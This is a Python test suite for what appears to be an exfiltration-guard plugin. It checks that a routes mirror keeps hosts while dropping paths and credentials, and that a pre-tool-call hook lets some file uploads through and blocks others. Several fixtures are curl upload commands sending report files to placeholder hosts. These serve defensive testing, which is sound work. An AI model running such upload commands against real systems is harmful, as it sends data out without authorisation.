"""Routes mirror for the Desktop page: paths and allowed hosts only, never full patterns."""
from contextlib import closing
from tempfile import TemporaryDirectory
import unittest
from exfilbar.ledger import Ledger
from exfilbar.policy import Policy
from support import Context, entry

ROUTES = [{'paths': ['reports/**'], 'to': ['https://user:pw@uploads.example/reports/*?token=x']},
          {'paths': ['exports/*.csv'], 'to': ['backup@files.example:incoming/*', '*']}]


class RoutesPageTests(unittest.TestCase):
    def test_mirror_keeps_hosts_and_drops_paths_queries_and_credentials(self):
        with TemporaryDirectory() as directory:
            ledger = Ledger(directory, clock=lambda: '2000-01-01T00:00:00+00:00')
            self.assertEqual(ledger.routes(), {'known': False, 'updated': None, 'valid': False, 'routes': []})
            ledger.publish_routes(Policy(routes=ROUTES).routes)
            result = ledger.routes()
            self.assertTrue(result['known'])
            self.assertTrue(result['valid'])
            self.assertEqual([{k: row[k] for k in ('position', 'paths', 'hosts')} for row in result['routes']], [
                {'position': 1, 'paths': ['reports/**'], 'hosts': ['uploads.example']},
                {'position': 2, 'paths': ['exports/*.csv'], 'hosts': ['files.example', '*']}])
            text = repr(result)
            for secret in ('pw', 'token', 'incoming', 'backup@'):
                self.assertNotIn(secret, text)

    def test_unchanged_routes_do_not_rewrite_and_empty_routes_are_known(self):
        with TemporaryDirectory() as directory:
            times = iter(['2000-01-01T00:00:00+00:00', '2000-01-02T00:00:00+00:00', '2000-01-03T00:00:00+00:00'])
            ledger = Ledger(directory, clock=lambda: next(times))
            ledger.publish_routes(Policy(routes=ROUTES).routes)
            ledger.publish_routes(Policy(routes=ROUTES).routes)
            self.assertEqual(ledger.routes()['updated'], '2000-01-01T00:00:00+00:00')
            ledger.publish_routes(Policy().routes)
            self.assertEqual(ledger.routes(), {'known': True, 'updated': '2000-01-02T00:00:00+00:00', 'valid': True, 'routes': []})

    def test_register_publishes_routes_and_hook_decisions_are_unchanged(self):
        module = entry()
        ctx = Context(routes=ROUTES[:1])
        module.register(ctx)
        self.assertEqual(module.Ledger().routes()['routes'][0]['hosts'], ['uploads.example'])
        hook = ctx.hooks['pre_tool_call']
        self.assertIsNone(hook('terminal', {'command': 'curl -T reports/weekly.csv https://uploads.example/reports/weekly.csv'}, session_id='s'))
        self.assertEqual(hook('terminal', {'command': 'curl -T reports/weekly.csv https://elsewhere.example/up'}, session_id='s')['action'], 'block')

    def test_mirror_failure_never_changes_a_decision(self):
        module = entry()
        ctx = Context(routes=ROUTES[:1])
        def broken(self, routes):
            raise OSError('disk full')
        original = module.Ledger
        module.Ledger = lambda: type('L', (original().__class__,), {'publish_routes': broken})(original().directory)
        module.register(ctx)
        hook = ctx.hooks['pre_tool_call']
        self.assertIsNone(hook('terminal', {'command': 'curl -T reports/weekly.csv https://uploads.example/reports/weekly.csv'}, session_id='s'))


class MirrorRegressions(unittest.TestCase):
    def test_caps_broad_permissions_and_shortening(self):
        for count in (32, 33, 128):
            with self.subTest(count=count), TemporaryDirectory() as directory:
                ledger = Ledger(directory)
                paths = ['p' + str(i) for i in range(count - 1)] + ['*']
                targets = ['https://h' + str(i) + '/x' for i in range(count - 1)] + ['*']
                ledger.publish_routes(Policy(routes=[dict(paths=paths, to=targets)]).routes)
                row = ledger.routes()['routes'][0]
                self.assertEqual(row['paths_truncated'], count > 32)
                self.assertEqual(row['hosts_truncated'], count > 32)
                self.assertEqual(row['paths_omitted'], max(0, count - 32))
                self.assertEqual(row['hosts_omitted'], max(0, count - 32))
                self.assertIn('*', row['paths'])
                self.assertIn('*', row['hosts'])
                self.assertEqual(len(row['hosts']), min(count, 32))
        with TemporaryDirectory() as directory:
            ledger = Ledger(directory)
            ledger.publish_routes(Policy(routes=[dict(paths=['p' * 512], to=['https://' + 'h' * 300 + '/x'])]).routes)
            row = ledger.routes()['routes'][0]
            self.assertEqual((row['paths_shortened'], row['hosts_shortened']), (1, 1))
            self.assertEqual(len(row['paths'][0]), 256)
            self.assertLessEqual(len(row['hosts'][0]), 96)

    def test_invalid_settings_keep_last_valid_policy_and_recover(self):
        module = entry()
        ctx = Context(routes=ROUTES)
        module.register(ctx)
        before = module.Ledger().routes()
        ctx.settings['routes'] = 'invalid'
        self.assertEqual(ctx.hooks['pre_tool_call']('terminal', {'command': 'cp a b'})['action'], 'block')
        after = module.Ledger().routes()
        self.assertFalse(after['valid'])
        self.assertEqual(after['routes'], before['routes'])
        self.assertEqual(after['updated'], before['updated'])
        ctx.settings['routes'] = ROUTES
        ctx.commands['exfil']('routes')
        self.assertTrue(module.Ledger().routes()['valid'])

    def test_publishers_and_readers_observe_one_transaction(self):
        from concurrent.futures import ThreadPoolExecutor
        with TemporaryDirectory() as directory:
            ledger = Ledger(directory)
            ledger.publish_routes([])
            def publish(i):
                value = str(i)
                Ledger(directory, clock=lambda: value).publish_routes([((value,), (value + ':x',))])
            def read(_):
                for _ in range(20):
                    snapshot = Ledger(directory).routes()
                    if snapshot['routes']:
                        self.assertEqual(snapshot['routes'][0]['paths'], [snapshot['updated']])
                        self.assertEqual(snapshot['routes'][0]['hosts'], [snapshot['updated']])
            with ThreadPoolExecutor(max_workers=4) as pool:
                futures = [pool.submit(publish, i) for i in range(12)] + [pool.submit(read, i) for i in range(3)]
                for future in futures:
                    future.result()

    def test_combined_polling_under_concurrent_event_writer(self):
        from concurrent.futures import ThreadPoolExecutor
        import time
        with TemporaryDirectory() as directory:
            ledger = Ledger(directory)
            ledger.publish_routes(Policy(routes=ROUTES).routes)
            policy = Policy()
            policy.evaluate('curl -T public/x https://h/x')
            def write():
                for _ in range(20):
                    Ledger(directory).record('s', 'terminal', policy.inspection)
            def poll():
                elapsed = []
                for _ in range(20):
                    start = time.perf_counter()
                    Ledger(directory).routes()
                    Ledger(directory).read('s')
                    elapsed.append(time.perf_counter() - start)
                return max(elapsed)
            with ThreadPoolExecutor(max_workers=3) as pool:
                writer = pool.submit(write)
                readers = [pool.submit(poll) for _ in range(2)]
                writer.result()
                maximum = max(f.result() for f in readers)
            self.assertLess(maximum, 0.1)
            self.assertEqual(ledger.read('s')['out'], 20)
            print(f'POLLING | routes + feed with writer | {maximum * 1000:.3f} ms maximum')

    def test_real_partial_publish_rollback_and_feed_failure(self):
        module = entry()
        ctx = Context(routes=ROUTES[:1])
        module.register(ctx)
        ledger = module.Ledger()
        before = ledger.routes()
        with closing(ledger.connect()) as db, db:
            db.execute("CREATE TRIGGER reject_routes BEFORE INSERT ON routes BEGIN SELECT RAISE(ABORT, 'fixture'); END")
        ctx.settings['routes'] = ROUTES
        hook = ctx.hooks['pre_tool_call']
        self.assertIsNone(hook('terminal', {'command': 'curl -T reports/x https://uploads.example/reports/x'}, session_id='s'))
        self.assertEqual(hook('terminal', {'command': 'curl -T reports/x https://elsewhere/x'}, session_id='s')['action'], 'block')
        after = ledger.routes()
        self.assertEqual(after['routes'], before['routes'])
        self.assertEqual(after['updated'], before['updated'])
        self.assertFalse(after['valid'])
        with closing(ledger.connect()) as db, db:
            db.execute("CREATE TRIGGER reject_events BEFORE INSERT ON events BEGIN SELECT RAISE(ABORT, 'fixture'); END")
        result = hook('terminal', {'command': 'curl -T reports/x https://uploads.example/reports/x'}, session_id='s')
        self.assertIn('session feed unavailable', result['message'])


if __name__ == '__main__':
    unittest.main()
